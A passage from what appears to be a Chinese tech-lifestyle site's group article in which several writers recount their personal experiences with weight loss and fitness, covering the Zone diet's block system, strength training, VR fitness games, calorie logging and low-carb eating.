网站的介绍</figcaption></figure><p>这是什么意思？你可能糊涂了。以一个女生（我）每天需要吃 11 Block 为例，每顿正餐是 3 B，下午、晚上各有 1B 零食。一共就是 3+3+1+3+1=11。每顿正餐里，我需要吃 3B 碳水化物，即需要摄入 27 克碳水，3x7=21克 蛋白质，3x3=9 克脂肪。每顿零食里，则只需要摄入 9 克碳水，7 克蛋白质，3 克脂肪。</p>\n<p>如果以男生为例，14 Block 的分配可以是 4+4+1+4+1 ，即每顿正餐吃 4 Block，零食吃 1 Block，也可以调整为正餐少些，零食多些，剩下的就是做乘法了。</p>\n<p>如果你看懂了，接下来的问题就是，每种食物多少克才算 1 Block？你可以点击<a href=\"https://zonediet.com/resources/food-blocks/\">这里</a>输入姓名与邮箱获得 Zone Block食材计算表，打开来就会发现，好多好多蔬菜才能算 1 Block，但一点点淀粉类主食和肉就已经是 1 Block 了。</p>\n<p>比如，33 克鸡胸肉算 1 Block，如果女生吃一顿 3 Block 正餐，鸡胸肉只能吃 99 克。但 1 Block 羽衣甘蓝足有 635 克，盒马一袋羽衣甘蓝才 100 克。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/b9bb4d5bbef6a3b416ebb6de37a72973.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/968a3009e4234ec260f2ac55bc3c0f58.png\"><figcaption>健康蔬菜与「不太健康」食品的重量比例，为了吃薯条，我真的拿电子秤称过🍟</figcaption></figure><p>因此，为什么 Zone 饮食法能减肥，原因很简单，按照这样的方法吃，一天摄入的卡路里数其实并不多。以下是我当时的 myfitnesspal 截图，可以看到，严格按照 11 Block 要求的时候，一天卡路里摄入量只在 1200 - 1300 左右。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/11/dfa6d83ef0a1bdac1eba58020cd65a3a.PNG\"></figure><h3>我吃了什么</h3>\n<p>为了认真减肥，2020年首次参加 Zone 减肥活动时我详细记录了自己每天的饮食。大部分时候我的三餐规划如下：早上吃半片全麦面包，一小瓶燕麦奶泡咖啡，无盐无糖花生酱，2个鸡蛋配2片火腿或芝士。午饭是烤红薯、番茄炒鸡胸肉、果仁，或者卷饼配西兰花和三文鱼，晚饭经常吃大白菜、蘑菇、虾仁煮一锅，配上果仁。</p>\n<p>一天当中的两顿零食，会吃一些水果配芝士、果仁。Zone 饮食法要求每天尽可能吃不同颜色的水果蔬菜，因此我吃了黑豆、卷心菜、番茄、彩椒、茄子、牛油果、橙子等等蔬菜与水果。我一般在早上或午休时锻炼，因此早餐与午餐我会吃更多淀粉类碳水，晚上则以蔬菜、蘑菇、肉类和果仁为主。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/11/ac1152ccf2f9fb5ba98f8aa0758a0f7a.JPG\"></figure><h3>我能尝试吗？</h3>\n<p>坦白说，一开始称重与切菜做饭环节的确挺累的。坚持大概半年后逐渐可以判断食量，大概知道自己一餐能吃多少。现在我已经很久不称蔬菜了。如果买新鲜肉类，我会将它按每份 3 Block 的重量分装，方便冷冻和解冻。虽然不提倡吃调味料，但我还是会吃酱油、沙茶酱与烤肉酱等调味料，给自己一点更好的减肥体验。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/11/4a9def67148346b0f80bbcdd317a16bd.jpg\"></figure><p>Zone 给我带来的第一个改变当然是掉体重。坚持 3 周后我的腰围已经小了 3 厘米，体重没有变化。坚持 6 周时我的肚子已经完全消下去，手臂上也因为配合运动逐渐有了线条。到今年，我的腰围其实因为腹肌生长反而上涨了，手臂和后背也有了和过去比起来更明显的线条。我很幸运，因为减肥时还是有合理摄入淀粉主食，我没有经历大姨妈紊乱，也没有掉头发。在规律运动之前，我大概每 1-2 个月都会感冒发烧，现在大概 3-6 个月才会有一些不舒服，而且很快就恢复了。我的指甲断裂消失了，皮肤也变得更好。</p>\n<p>Zone 给我的第二个改变是，我听懂了身体的信号。配合减肥饮食时，每天需要保证 2L 饮水。我的教练教会我一个观念：有时候你觉得饿了，并不是真的饿了，而是身体渴了。如果这时及时补充一些水分，再过 20 分钟，你会发现自己也许不饿了。如果还是感到饥饿，当然可以及时补充食物。但在这个美食诱惑太多太多，大家把吃喝当作一种发泄的环境里，我们的身体真的需要摄入那么多、那么重口味的食物吗？经过一段时间的体验之后，我发现其实并非如此。</p>\n<p>这甚至不是计算卡路里的游戏。因为很久不吃添加糖，偶尔忍不住吃甜品的时候，我会感到加倍快乐，之后会立刻感觉到口腔里分泌的唾液味道变了，我能感受到甜品给我身体带来的变化。自从坚持这种饮食后，我大概一年没有吃过一整碗面条、一整盆米饭。Zone 没有欺骗餐，但真的很想吃的时候，我也会去吃几口。它让我明白，原来有时候真的吃几口就饱了。（<s>剩下的都给男朋友家人吃掉了，没有浪费！</s>）</p>\n<h3>我真的坚持不了，但我还想瘦，怎么办？</h3>\n<p>因为 Zone 饮食法和每周 5 次的高强度 CrossFit 与举重训练，我开始更多关注运动员的饮食，也做了自己的公众号。我才知道原来不是所有运动员都吃水煮西兰花和鸡胸肉，也不是所有人都认为米饭面条是减肥的敌人，但所有人都会选择干净、未加工或少加工的食物。如果所有减肥方法对你来说都太痛苦，我认为可以尝试的就是，<strong>尽量吃完整、干净的食物。不要吃人工添加食物，尽量少吃重口味的东西</strong>，因为那会导致你想吃更多米饭、喝更多饮料压住味道。</p>\n<p>如果这对你来说也是无法承受的痛苦，或许还可以尝试将日常吃的东西做一些小小的改变，比如<strong>下午不喝奶茶，改喝一瓶无糖苏打水，含糖花生酱换成无糖无添加花生酱，不吃封装好的芝士面包，换成现烤法棍，果仁可以买无添加无调味的，果干也可以选择无添加西梅干之类的健康零食，或者多与大家分享零食</strong>。（<s>本人两周前买了一盒芝士蛋糕，自己吃了 25 % ，剩下 75 % 拿到健身房去互害</s>。）</p>\n<p>减肥是一个考验胃更考验意志力的过程。我学到的一个很有用的方法是，晚上 10 点想吃加了午餐肉和鸡蛋的辛拉面时，告诉自己只要忍过今晚，如果明天还是想吃，就去吃，很多时候到了第二天，我已经完全想不起自己昨晚想吃什么了。</p>\n<p>当然，有的时候真的太想吃了，那就吃吧，毕竟作者本人在码字的时候已经忍不住吃掉了剩在家里的半包多力多滋，截止今年也喝了 2 杯手打柠檬茶，吃了 1 根雪糕。</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@胖鱼要进步\" user-id=\"bs2p86tb34tcs0pmdp20\" href=\"https://sspai.com/u/sylvia\">@胖鱼要进步</a> 他们都说不懂瘦子不长肉的痛苦，那我就来试试</h2>\n<h3>个人身体情况介绍</h3>\n<p>首先声明一点，在体重方面我确实没有凡尔赛。真的是自己骨架小加本身肠胃不好吸收差，所以从小就瘦。截止到目前为止，体重都没有超过 100 斤过，所以从来没有想过减肥。</p>\n<p>我自认为自己没有运动天赋，至少小时候学校运动会项目基本没参与过，只有可数的 1500 米这项赛程，唯一的身体优势就是骨头软柔韧性好，但是第一感觉给到别人依旧是「好瘦」。直到大学的时候，可能是为了更了解某任 npy 吧，开始接触篮球和健身。自此，真正开启了健身之路，然后慢慢意识到自己对球类运动的一些兴趣，开始尝试各种类型运动。而我的健身目的也很简单，那就是塑形。</p>\n<h3>我的健身经历变化</h3>\n<p>从第一天进健身房，我就没有请过私教，真的就是自己练。当然过程中也收获了很多教练和热心健身大佬（身型特棒的大叔们居多）的言语指导，在我一个人默默训练的时候给予适当的指导。</p>\n<p>因为本身身体现状，我在健身房基本不做有氧运动，直奔器械和力量区。所以在健身初期时，稍微长肌肉的我面对「突涨的体重」和「变宽的肩膀」时，是稍微有点不知所措的。所以瘦人在接触力量训练之初，是一定会有一些明显变化的。虽然一开始的肩变宽让我无法接受，但是现在的我正所谓真香，对肩膀引以为傲，经常看我 ins 的朋友们肯定知道我到了夏天超爱吊带，凡是能让我露出肩膀和背部的衣服，我真的爱不释手。因为通过健身，已经把身体优势慢慢地展现出来了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/65876f62785600d044e050a52e927eea\"></figure><p>那时候刚健身时，自己从一通乱练到开始根据部位进行安排训练，慢慢有了自己的训练节奏。但其实我的健身计划是随着我对健身的误解打消进行阶段性变动的。比如一开始的时候，我是不练腿和胸的，因为我怕把腿给练粗（但其实越到后边了解到一些更专业的知识后，你就知道这是个错误想法）同时练胸也不会让我变成大🐻（我身体上的肉一共就那些，练胸当然不是为了胸变大）。包括有段时间觉得手臂没什么变化，就放弃了单练手臂的计划。</p>\n<p>但是现在慢慢地看到身体形态变化后，会认真的去考虑哪些部位的训练优先级更高。我现在手臂肩膀的肌肉其实非常明显了，当然自然状态下依旧还是看起来瘦但是不弱了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/5bc348ece3fa03d9717255cdbf1fe03d\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/10289ee6471d04ecba04eef56075f0e8\"></figure><p>前段时间在健身房跟教练交流，虽然我从来不上私教，但他们还是会乐意分享针对我个人身体的一些计划偏向。比如目前阶段我可能会更侧重臀腿和背部的训练。前段时间拍了下后背，除了惊讶于肩部形状外，确实是感觉出来背部肉真的是太少了。说明要加强的还很多，除了训练，在饮食上也开始更多地关注起来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/9407c5e23aab86cfada9eabb085a8ee2\"></figure><p>关于我的个人健身计划，其实在我以前的文章里都提到了很多（包括有氧和力量），在这里就不多赘述了。希望大家可以找到适合自己身体情况的健身计划即可。</p>\n<h3>后期觉醒：饮食计划跟进</h3>\n<p>我的饮食改进其实是前几个月才开始实施的，健身多年其实我对饮食方面真的没有刻意注意和改变过，所以身材变化才会不明显吧。</p>\n<p>前几个月因为工作环境的变动，基本工作日下午都会去到健身房锻炼半小时左右。所以为了迎合我的健身计划，早午餐也都进行了同步变动。</p>\n<h4>早餐：肉碳奶</h4>\n<p>作为一个从小的肠胃受害者，我是一直比较偏养生派，一年四季都保温杯的都那种。所以不管是工作日还是周末，早餐是一定要吃的。</p>\n<p>工作日早上一般在护肤之前，会提前把牛奶热上（有时可能是酸奶）。正常状态下为了节省时间，通常是一杯牛奶+两片粗粮面包切片配一块火腿。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/829b6a5944c0c97014ca089ebca9986a\"></figure><p>虽然看起来食物量不多，但是吃完也足够饱，撑到午饭绝对没有问题，而且口味基本清淡但也不缺营养。蛋白质有，碳水有，也不至于上午工作时因为早餐食物油腻而感到心情烦躁。</p>\n<h4>午餐：鸡蛋+蔬菜+白肉+豆腐</h4>\n<p>早餐没有加鸡蛋的原因，主要是为了节省时间，所以我把鸡蛋挪到了午餐。我的午餐其实非常简单，烹饪方式也很单一，就是水煮。</p>\n<p>午餐基本配置就是带颜色的蔬菜（包菜/生菜、菜椒、胡萝卜、西兰花等可选）、白肉（鸡胸肉/巴沙鱼）、鸡蛋一颗、豆腐一小块。</p>\n<p>关于食物选择这块，大家可以参考之前乔淼老师的这篇文章<a href=\"https://sspai.com/post/66828\" target=\"_blank\">早安干饭人：想要上午就起飞，这顿早餐得吃对 - 少数派</a>，虽然是针对早饭的食材选择，但是也很有借鉴意义。</p>\n<p>当然全水煮吃起来真的是毫无味道，所以我会在食材水煮/蒸熟过水后，进行一点调味。调味也非常简单，就是醋+蚝油+少许辣椒粉进行简单调味，增添一点咸辣口。当然如果稍微重口一点的朋友，可以自己再加一些酱料等丰富口味，注意用量即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/a866f63b650bac783c1b8727d210b6df.png\"></figure><p>当然如果想省事，建议跟我一样，提前一两天把最近要吃的鸡胸肉提前蒸好，然后撕成条状加点调料备用。这样每天准备时，只需要水煮那些青菜即可（时间基本 5 分钟左右就搞定），然后冷水过凉加入鸡胸丝即可快速完成一顿饭，简单省时。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/d0c0d633380982b1dd6a05a576012cc6.png\"></figure><p>我对自己的饮食只能说是规划化了，但是并没有到那种精确到量的程度。比如每顿摄入多少蛋白质等，目前还没到这个阶段，只是会着重蔬菜和蛋白质的摄入，尤其是健身当天。</p>\n<p>更多细节化的饮食标准，希望自己和想要增肌塑形的朋友们一起在未来健身的过程中，逐步去了解和丰富相关知识吧，一起加油！</p>\n<h4>晚餐：适量、合适即可</h4>\n<p>晚餐的话我一般看情况，馋了的话就吃自己想吃的，或者正好有饭局或者夜宵，都是可以接受的。以前我对于晚 8 点之后再吃东西是严令禁止的，因为我胃不好，过晚摄入可能会造成消化不良然后入睡困难。现在是可以接受夜宵了，但是在食量上依旧是有着分寸。</p>\n<h4>周末：允许放肆，小心肚肚</h4>\n<p>好多人听我说完午餐后，都觉得我有些过于狠了，这样吃不腻吗？腻，但是我只有健身当天的一餐是这种配置，并不是顿顿都这样，要不我早就吃吐了。</p>\n<p>到了周末我就会放肆起来，正常吃喝大餐走起。虽然切换为放肆模式，但这个放肆也不是完全不顾的撒欢，食物选择上尽量还是少油少甜。因为工作日午餐的清淡饮食习惯，已经慢慢地把我胃提高了「要求」。过甜的开始齁，喉咙会超级不舒服。过油的食物吃完第二天肠胃就开始表演「厕所大法」，所以我的胃大概就给了警告「你可以放肆，但希望你自己有点数」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/cf10fb6a787de6e7bde2ac8bc579f938.png\"></figure><p>毕竟生活中，没有美食填充那得多没意思啊，我还是非常喜欢一人食去打卡一些好吃的。</p>\n<h3>身体变化小总结</h3>\n<p>其实算起来，从健身开始已经 4 年多了吧，说起来身体变化还是非常明显的，虽然现在规范饮食后，体重下降了些许（已经降到 90 斤以下了）。但是在肌肉状态方面，线条感更明显的手臂、维度更宽的臀部、不用刻意锻炼就会出来的马甲线等，其实都是这些年健身所带来的肌肉维度改变。</p>\n<p>我瘦其实主要是因为骨架小，所以看起来瘦。但其实以前的时候脂肪率也到过 28% 左右。现在虽然体重轻了，但是肌肉率是明显上升的。目前就是肌肉率维持在 74% 左右，也让体脂率稳定在 20%-21%。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/1581bddcd9deaa3a5f27156ed23920bf.png\"></figure><p>有时候在运动上我也很懒，走 2 公里路我觉得会很累不想尝试，但是举铁半小时我觉得就很爽。每个人的运动习惯和爱好各不相同，没必要全部细节都去照搬别人，找到自己喜欢的节奏和类型即可。</p>\n<p>羽毛球乒乓球我也可以打的酣畅淋漓，直呼好爽，这种看似平常的运动其实对心肺功能和协调性、力量等都有着很多的训练成效。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/a90aa10a8d8cf9ba43e4e47ae4703950\"></figure><p>运动的过程中就是逐渐开始熟悉自己的身体状态，饮食的搭配其实也是在照应身体的变化。松和紧是相互平衡的，运动上松懈了那就在饮食上紧一紧；运动上酣畅淋漓了，那就可以准许自己在饮食上放松一下。</p>\n<p>希望大家可以在体会运动中，逐渐把握住自己的「跃动节奏」。</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@克莱德\" user-id=\"bs2p00tb34tch278ngkg\" href=\"https://sspai.com/u/clyde\">@克莱德</a> 我减肥只是为了能好好活着</h2>\n<p>一切还得从「去年最胖的时候」这个节点讲起。</p>\n<p>那时我已经在家办公了一年多时间，并且刚刚度过了一个满是芝士奶盖茶的炎夏。从小到大都没有午休习惯的我，那段时间总在下午 2、3 点左右遭遇难以抵抗的困意，晚饭时间稍有推迟，又会迅速出现虚汗、心悸等问题；加上那时觉得自己年轻总是熬夜「修仙」，好几个晚上都觉得自己应该是走到了猝死的边缘。</p>\n<p><strong>虽然这么说有点俗气，但在接下来的这段经历中，「管住嘴、迈开腿」的确成为了我每天都在暗示自己的理念</strong>。</p>\n<p>我尝试从生活中的方方面面将置自己于生死边缘的危险因素降低到最小。在最原始的求生欲驱动下，我将送给女朋友的七夕礼物 —— 刚到手不久便吃灰的健身环拿了出来，随即开启了一段对自我健康的救赎之旅；不久后 Nintendo Switch 送给了亲戚家的小孩儿，我又将目光转向了 Oculus Quest 上的 Beat Saber、Eleven Table Tennis、The Thrill of the Fight 等体感健身游戏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/89bff432d4285789c7bd996bdef7a2e9\"><figcaption>推荐的 VR 健身游戏</figcaption></figure><p>不得不说，健身环和 VR 游戏都挺累人的，虽然它们在我看来都不算是什么正经的「运动」，一开始我也因为不确定自己的身体状况，无法将所有成果都归于它们。但健身环和 Beat Saber 确实让我养成了每天都得运动、每次运动一定会浑身被汗水浸透的习惯。</p>\n<p>偶尔躺在沙发上不想动的时候我也会暗示自己：听听歌、动一动有什么不好，每天流一点汗也比什么都不做要好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/c73b1e56636844b49656d8072749be48\"><figcaption>K/DA 伴我瘦身</figcaption></figure><p>饮食方面，盒马的各种全麦面包、三明治成为了过去这段时间早餐的常客，如果哪天觉得腻了，就酸奶兑上坚果、即食麦片解决；午饭以鸡肉、牛肉为主，基本没有再吃过肥肉，包括自己最拿手的回锅肉以及回锅肉油泡饭；同时强制自己习惯先吃青菜再吃米饭的模式——作为一个之前有些挑食的人，每顿一定要吃到自己觉得有些抗拒了再吃米饭；晚饭则以季节性的水果为主，家里还备着一些全麦小面包、荞麦面条，晚上实在扛不住（比如睡前饿得睡不着了）的时候就当夜宵。</p>\n<p>至于我最爱喝的奶茶，在羊店 <a href=\"https://sspai.com/post/55731\" target=\"_blank\">这篇文章</a> 的指导下，我也为自己设置了一个定时定量的 quota：每周一杯。刚开始肯定是很难熬的，但往后就逐渐从「这周的昨天已经消耗掉了所以今天就别想了」变成「这周的 quota 还没用但我今天似乎不喝也还行？」</p>\n<p>那么成果呢？从今年 1 月至今，我的体重已经减轻了 8.2KG，比起去年最胖（75.5KG，BMI 值 24.9）的时候减重 10.3KG。</p>\n<p>8 月刚做完了今年的体检，除了 <a href=\"https://zh.wikipedia.org/wiki/%E5%A4%A9%E5%86%AC%E6%B0%A8%E9%85%B8%E6%B0%A8%E5%9F%BA%E8%BD%AC%E7%A7%BB%E9%85%B6\" target=\"_blank\">天冬氨酸氨基转移酶</a>（谷草转氨酶）偏低、<a href=\"https://zh.wikipedia.org/wiki/%E4%BD%8E%E5%AF%86%E5%BA%A6%E8%84%82%E8%9B%8B%E7%99%BD\" target=\"_blank\">低密度脂蛋白</a> 偏低外没什么大问题，也算是解开了此前一直困扰自己的「心结」：和那些疯狂减肥的人相比，我感觉自己什么都没做却还是瘦了不少。</p>\n<figure class=\"ss-imgRows\" figcaption=\"今年的体重记录（左）和最胖时的体重（右）\"><img src=\"https://cdn.sspai.com/2021/09/16/6f5ed5b11636a7393e151cd7f7dc416d.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/16/5a1b8d331c811cb029e30eb2e4135dc0.png\" alt=\"\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/974278facc6a6653031dee24c7d8f6ef\"><figcaption>彼时的 BMI 值</figcaption></figure><p><strong>不过体检报告还是反映了一些问题，上面提到的饮食习惯其实是不太合理的</strong>——相比此前每天回锅肉下白米饭吃到撑、下午还要来一杯芝士奶盖茶虽然是健康了些，但该摄取的脂肪和蛋白质还是得摄取。</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@啊桂酱AGuiJ\" user-id=\"bs2p7n5b34tcs0pm8slg\" href=\"https://sspai.com/u/b5u2xlhk\">@啊桂酱AGuiJ</a> 去经历变瘦的过程，才能得到想要的答案</h2>\n<p>按照国际惯例，先放一张我减脂前后的对比图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/b7071afd5e6c8ede54716408bc168f77\"></figure><p>左图是我最胖的时候，2016 年秋天；右图是上个月去乐山玩儿的时候在酒店拍的。虽然左边因为拍摄角度，把我腿粗的特点放大了，但跟右边的匀称放在一起对比，整个人像是被「横向拉伸」了。</p>\n<p>我的发胖其实是从初中开始，为了治疗哮喘，吃了很多有激素的药，人一下子就肿起来了。因为跟同学相处融洽，加上大家都比较专注学习，所以身材不是我的困扰。直到大学，发觉自己的外形不在主流审美线上，我给自己贴上了「胖」这个标签，并开始尝试减肥，然而过程在立志 1 个月瘦十斤然后饿了一天就放弃之间无线循环，并最终陷入了到绝食和暴饮暴食的僵局。</p>\n<p>就这样，大学四年没瘦下来。一晃到了 16 年，我一个人去了新加坡旅行，在滨海湾花园闲逛时拜托路人帮忙拍个照，也就是上面的左图。然后余下的整个旅程，我都陷入了沉思：为什么看到照片后我觉得羞愧并再一次迫切想要变瘦？我期望的「瘦」到底是什么？</p>\n<h3>学习</h3>\n<p>为了解答自己的疑惑，我开始认真研究「减肥」。</p>\n<p>首先是大量阅读别人的经验，不论性别，年龄差距在 5 岁左右，不论目标的差异——1 个月减 10 斤或半年瘦 10 斤，只要是认真的分享。在通过微博、公众号及 B 站研究了 10 个左右真实的案例后（剔除掉相当多的虚假案例，还有一些直接卖减肥药的），我收获了两个要点：</p>\n<ol>\n<li>BMI（Body Mass Index 身体质量指数）</li>\n<li>三分练，七分吃。</li>\n</ol>\n<p>BMI是一种普遍的衡量身体质量的指标，截止目前，我仍然看到有国外的科研机构，国内的专业营养师以及健身教练将其作为超重（BMI&gt;24，有的国家是 25）的判断依据之一。当时我的 BMI 是 23、接近 24，半只脚踏入超重这个行列了，然而并没有到肥胖（BMI 大于 28，有的国家是 30）。所以，我先帮自己把「胖」这个标签撕下来，自然我也不需要「减肥」。</p>\n<p>第二个要点是几乎每个成功案例都在强调的。其实为什么长胖大家心里都有数，摄入的能量大于了消耗的能量，只是我们在学习相关知识前不明确自己摄入的是什么、有多少，以及能带来多少能量。并且想要活下去就得靠摄入，而运动对我们普通人来说，可以是爱好，也可以是保持健康的手段，不是必选项。</p>\n<p>在这之后，我强烈的感觉是自己需要去经历变瘦的过程，才能得到想要的答案。</p>\n<h3>实践</h3>\n<p>首先把体重变化贴出来：一年多的时间，我减了近 16 斤。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/432101157c5b3508b651c0c3e5f35a7e\"></figure><p>方法遵循上面的二个要点：一是注重并记录饮食，二是坚持运动。</p>\n<p>饮食方面我选了薄荷健康来记录，先设置好自己的身高以及当前体重，再设置好目标——用多长时间减去多少体重，App 就会计算出建议你每日饮食摄入的总能量，当日完成记录后，还会给出三餐及三大营养素（脂肪、蛋白质、碳水）的分析和建议。运动方面我基本上都是跳绳、跑步或者在家跟练 Nike 推出的 Nike Training Club App 上的课程（现已下架）和 Keep 上的课程。</p>\n<p>这个期间我不是每天都健康饮食，毕竟「横向发展」了这么多年，饮食习惯已经养成，所以最开始经常超出设定的热量，也比较气馁，觉得要改变好难。只不过随着记录，心里逐渐对食物的认识清晰了起来，也对吃进去了多少有了数。比如之前一直觉得每顿饭吃撑就行，不管吃的什么，现在会注意每天碳水、蛋白质和脂肪的分配；之前觉得早上一碗小面就好（重庆人日常），现在意识到满满一碗小面是 500g 左右，而 2 两等于 100g，红汤小面中几乎只有碳水和脂肪（其中的青菜可忽略不计），缺乏蛋白质。并且小面是精制碳水，营养较少，不如粗粮来得健康。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/015a52d2e0708948489db73b045e42d5\"></figure><p>一个意外收获是因为减少了早餐的精制碳水、增加了蛋白质摄入后，我发现早上的精力变好了，脑袋转得快一些了，对比没有注重早餐吃什么的时候，我以为自己是早上没睡醒，所以上午上班效率很低。而在瘦身的这段时间里，我明显感觉自己能在上午保持一个良好的精神状态（除非是昨晚熬了大夜）。这里要强调一下，每个人体质不同，与我而言减少一些精制碳水能让我头脑清醒一些，不代表对其他人也有同样效果。</p>\n<p>与此同时，我也不是每天都运动。只是最开始着急看到效果，刚好又遇到换工作，所以每天在家都运动 30 分钟以上，有时候还每天两次，一次 HIIT，一次有氧：跑步或跳绳。换新单位后就没那么多时间运动了，尽力保持每周 3 次。然后渐渐地，运动次数维持在每周 2-3 次，从最高点回落到正常范围内，偶尔状态不好，或者遇到生理期，可能一两周都不运动。</p>\n<p>所以，我并不是一个十分克制的人，也经历过瓶颈和自我怀疑，只不过用瘦身的目标驱动自己去坚持，从结果来看，面对那些「放纵」的日子，其实不用太过焦虑，一时的低谷也没什么，需要多给自己一些耐心。</p>\n<p>在成功瘦身后，我感受到了对身体的掌控，不再是沉重的身躯而有种轻盈感，也养成了健康的饮食习惯。回过头去回答 16 年的疑问，「瘦」的意义与我而言是爱惜自己的身体、爱自己。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/c518a2737409023469308ae383e5add5\"></figure><h3>后续</h3>\n<p>我在19年复胖了，因为放松了对自己的要求：吃得重油重盐，运动次数也屈指可数。花了几个月的时间重新调整，注意饮食并配合运动就又瘦下来了。然而通过这个阶段，我发觉瘦身其实是保持一种生活习惯，让自己「轻装上阵」、能有精力去完成更多想做的事情，而不是拖着沉重的身躯「负重前行」。</p>\n<h2>\n<a class=\"ss-atUser\" data-mention=\"@张奕源Nick\" user-id=\"bs2p1gdb34tch27964m0\" href=\"https://sspai.com/u/nicholaszhang\">@张奕源Nick</a> 我用不着减肥，但我想体验一下</h2>\n<p>严格地讲，我没有减过肥过。我身高 177 cm，体重 65 Kg 左右，一直以来我更长远的体重目标都是增重而不是减肥。不过，由于接触到了科学饮食的理论知识，加上我一直有健身，所以的确刻意控制过体重，特别是体脂，也观察过自己的身体在不同情况下的变化。</p>\n<h3><strong>低碳水饮食，以及轻微地控制体脂率</strong></h3>\n<p>这几年，生酮饮食在国内火了起来，我派近期也发表过 <a href=\"https://sspai.com/post/67777\" target=\"_blank\">关于生酮饮食是否适合大众的相关文章</a>。同事问路在入职少数派前曾参与过一个和生酮饮食相关的项目，我也从他那里第一次正式接触到了这个概念，并在大约三四年前开始严肃地了解各种饮食方案及健康饮食理论。</p>\n<p>在我的实践中，我其实并未严格意义上地生酮过。我在了解了生酮饮食及其它健康饮食理论后，对它们的特点进行了结合，最终采用了「低碳水饮食」的饮食结构，即：在我原来的饮食结构上减少碳水化合物的比重，增加脂肪和蛋白质的比重；不吃一切糖，减少精制碳水，改用其它食物替代。</p>\n<p>想要改变传统以碳水为主的饮食结构确实不容易，尤其在平时上班点外卖时，可以选择的选项着实不多。正因如此，我开始在这个阶段重回厨房，高频下厨，以保证自己的饮食质量。</p>\n<figure class=\"ss-imgRows\" figcaption=\"我最瘦的时候和最近的身体指标，变化还挺明显\"><img src=\"https://cdn.sspai.com/2021/09/16/676a69a1344545fa15d13295be86f6ba.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/16/2bce1a3912dcdbca96b8448404c446b4.png\" alt=\"\"></figure><p>经过我的实践与观察，饮食和体重、体脂的关系非常密切。即使我已经刻意控制饮食比重，但也不是餐餐都遵守自己的原则。相反，我也有想要「放纵一下」的时候，不定期地大量吃粉、面、饼等碳水主食，而且每次「放松」一段时间，体重和体脂都会明显增长。</p>\n<p>所以，低碳水的饮食方案就成了我调节体重的工具。在我觉得体脂过高或着身体感受不够好的时候，我就让饮食结构严格一点，把体重和体脂控制在可接受的范围内。稳定一段时间之后，我再找机会过过嘴瘾。</p>\n<p>低碳水饮食的另一个好处是能提升精神感受。除了会变胖，碳水——或者说糖类——的另一大隐患就是会造成血糖波动，导致人疲惫困倦。而在我低碳水期间，能明显感受到整个人更精神，疲惫感更少，而且做事时的专注力也有所提升。</p>\n<p>总体来说，我的身体能明显感知到「吃糖就会变差」，所以糖和碳水就成了我调节「心理喜悦」和「身体舒适」平衡的工具。这种饮食控制需要一定的自律，但在摸到门路之后，由于可以明显感知心理和身体上的变化，所以实操起来也不算难。</p>\n<h3><strong>健身运动，给能量找个去处</strong></h3>\n<p>人们常说减肥的秘诀就是「管住嘴、迈开腿」，这句话虽然俗气，却也道出了减肥的核心原理：人体每天消耗的能量是相对固定的，如果摄入的能量超过了身体所需，身体就会把多余的能力以脂肪的形式存储起来。反之，如果消耗大于摄入，人体就会从囤积的脂肪里摄取能量。所以，想要控制体重，除了在饮食结构上做调整之外，提升身体代谢也很重要。</p>\n<p>最直接提升代谢的方法当然就是运动，通过健身来增加身体的能量消耗。我自打规律健身以来，最明确的身体反馈就是饥饿感变多了，也促成了我「少食多餐」的习惯。</p>\n<p>如果你的运动目标是减肥，那应该尽可能进行对心肺要求更高的无氧运动。许多人都会通过慢跑来减肥，但慢跑的减重效果没有那么明显，只有跑步时间达到一定长度后，身体才能进入比较高效的燃脂状态。</p>\n<p>我个人也一直在参与 HIIT、Crossfit 类的综合训练，在燃脂的同时，这些运动还兼具力量提升、塑形等效果，运动过程也比长跑更具趣味与挑战性。久坐于电脑前的上班族们身体机能普遍比较差，综合运动可以有效地提升体能和人的精神状态，让睡眠、饮食等都变得更好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/16/article/927079cfc319d142bd4e804e42ca27a8\"><figcaption>Apple Fitness+ 上的 HIIT 